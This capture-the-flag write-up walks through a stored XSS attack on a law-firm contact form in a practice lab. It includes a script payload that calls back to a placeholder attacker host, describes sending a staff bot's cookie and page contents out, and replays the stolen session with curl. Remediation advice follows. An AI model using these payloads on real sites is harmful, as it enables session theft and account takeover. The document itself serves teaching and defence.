# JurryHurry — A Stored XSS Walkthrough

**Platform:** WebVerse Pro  
**Theme:** Law-firm engagement portal  
**Difficulty:** Beginner-friendly  
**Techniques:** Stored Cross-Site Scripting, Session Hijacking, Cookie Replay

---

## Scenario

A long-established law firm runs a public-facing website where potential clients can submit enquiries through a contact form. Staff review those enquiries through an internal admin portal. A headless clerk bot polls the queue at regular intervals.

The managing partner wants an assessment of the portal's security before an upcoming compliance review.

---

## Recon

The target is a single nginx server on port 80.

```
nmap -sC -sV -Pn -p 80 <TARGET>
```

A quick directory discovery pass reveals:

- `/contact` — a standard contact form (name, email, subject, message body)
- `/admin` — redirects to `/admin/login`, a staff portal login page

The login page alone doesn't give anything up — no default creds, no SQLi obvious on first glance. But the CSS file is worth a read.

> Pro tip: always check the stylesheet. Developers often leave styles for pages that aren't linked anywhere visible. In this case, the CSS contained classes like `.admin-wrap`, `.queue`, `.msg-body`, and — notably — `.flagbox`.

That tells us the admin panel renders a queue of submitted messages, and somewhere on the page, there's a box with the firm's secret. A privileged viewer (the clerk bot) reaches this page.

---

## The Vulnerability

The contact form accepts arbitrary input across all fields. The message body (`#message`) is the field of interest — it gets stored server-side and rendered back in the admin queue view without any sanitization.

Additionally, when the clerk bot receives its session token, that cookie is **missing the HttpOnly flag**. This means `document.cookie` can read it from JavaScript.

Two conditions that shouldn't be in production together.

---

## The Approach

**Step 1: Set up a listener**

You'll need a way to receive callbacks. A simple HTTP server on a reachable IP works fine — the lab VPN allows the clerk's browser to reach your machine.

```bash
python3 -m http.server <PORT>
```

Or something more targeted that logs every request path.

**Step 2: Submit a test payload**

Craft a minimal XSS probe to confirm the sink exists:

```html
<script>new Image().src='http://<YOUR_IP>:<PORT>/test'</script>
```

Submit it through the contact form and wait.

**Step 3: Collect the goods**

When the clerk bot polls the queue, your payload executes in the browser context of an authenticated admin session. Two things worth exfiltrating:

1. **The cookie** — `document.cookie` gives you the clerk's session token
2. **The page HTML** — `document.body.innerHTML` contains everything rendered in the admin view, including the firm's secret

**Step 4: Replay the session**

Use the stolen cookie to access `/admin/` directly:

```bash
curl -b 'jh_session=<STOLEN_VALUE>' http://<TARGET>/admin/
```

If the cookie is still valid, you'll see exactly what the clerk sees — the full contact queue and the flag.

---

## Key Takeaways

| Issue | Why It Matters |
|-------|----------------|
| **No output encoding** | User-controlled input rendered raw in a privileged view is stored XSS |
| **Missing HttpOnly flag** | Session token becomes readable by JavaScript, making XSS far more dangerous |
| **Automated bot viewer** | Even a simple XSS payload gets triggered without social engineering |
| **No CSP** | Inline script execution isn't blocked, so payloads run freely |

---

## Remediation

1. **HTML-entity-encode all user input** at render time — never trust data that came from a form
2. **Set HttpOnly and Secure flags** on session cookies — `document.cookie` should never see them
3. **Implement a Content-Security-Policy** — `script-src 'self'` blocks inline scripts
4. **Rate-limit form submissions** and add CSRF tokens to prevent automated abuse

---

## Tools Used

- `nmap` / `rustscan` — port discovery
- `ffuf` — directory enumeration
- `curl` — form submission and session replay
- Python `http.server` — callback listener
- `nc` — backup listener

---

## Final Thoughts

This is a textbook stored XSS-to-session-hijack chain. The individual weaknesses are common (unsanitized form input, missing HttpOnly), but paired together with an automated viewer, they create a clean kill chain.

The fix isn't complicated — it just requires treating every piece of user-supplied data as hostile until proven otherwise.

---

*Lab box from WebVerse Pro. No flags included — go find your own.*
